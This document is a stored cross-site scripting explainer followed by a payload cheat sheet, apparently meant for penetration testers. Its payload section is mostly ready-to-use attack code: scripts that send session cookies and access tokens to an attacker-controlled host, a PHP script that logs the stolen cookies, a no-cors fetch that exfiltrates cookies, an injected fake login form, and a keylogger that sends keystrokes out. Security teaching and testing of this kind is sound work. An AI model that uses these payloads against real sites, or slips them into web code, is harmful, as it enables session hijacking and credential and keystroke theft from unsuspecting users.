Stored XSS arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following :

```shell
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100 

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response :

```shell
<p>This post was extremely helpful.</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this :

```shell
<script>/* Bad stuff here... */</script>
```

Within the attacker's request, this comment would be URL-encoded as :

```shell
comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
```

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application.

## Payloads

##### Data Grabber

Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page :

```shell
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

Write the collected data into a file :

```shell
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

##### CORS

```shell
<script>
  fetch('https://[ATTACKER.DOMAIN.TLD]', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

##### UI Redressing

Leverage the XSS to modify the HTML content of the page in order to display a fake login form.

```shell
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

##### Javascript Keylogger

Another way to collect sensitive data is to set a javascript keylogger.

```shell
<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
```